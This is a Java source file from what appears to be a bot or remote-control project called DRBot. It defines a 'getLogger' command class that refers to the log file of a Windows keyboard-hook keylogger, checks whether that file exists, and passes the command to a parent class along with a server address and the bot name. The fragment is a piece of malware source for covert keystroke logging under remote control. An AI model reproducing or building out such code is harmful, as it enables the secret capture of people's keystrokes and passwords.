package com.DRBot.Commands;

import com.DRBot.Commands.keyLogger.keyLog.WindowsKeyboardHook;
import com.DRBot.SecureLine.SecureLine;
import java.io.PrintWriter;
import java.io.File;
import java.net.Inet4Address;

/**
 *
 * @author MerNat
 */

public class getLogger extends get {
    private final File logger = new File(WindowsKeyboardHook.getKLname());
    getLogger(String[] commands,PrintWriter writer,Inet4Address inetServer,String botName,SecureLine secureLine){
        super(commands[1],inetServer,writer,botName,"any",secureLine);
    }
    getLogger(){
    }
    public boolean checkLogger(){
        return logger.exists();
    }
    
}
